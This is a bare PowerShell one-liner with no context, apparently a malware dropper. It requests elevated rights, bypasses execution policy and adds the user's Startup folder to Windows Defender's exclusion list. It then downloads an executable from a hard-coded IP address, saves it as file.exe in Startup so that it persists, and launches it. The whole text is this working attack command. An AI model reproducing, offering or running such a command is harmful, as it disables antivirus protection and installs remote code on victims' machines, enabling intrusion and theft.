$strtp="C:\Users\$env:username\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";$Client=New-Object System.Net.WebClient;Start-Process -Verb RunAs powershell.exe -Args '-executionpolicy bypass -command', "Set-MpPreference -ExclusionPath '$strtp'";cd $strtp;$Client.DownloadFile('http://87.15.253.23:443/client.exe', $strtp+'\file.exe');start .\file.exe
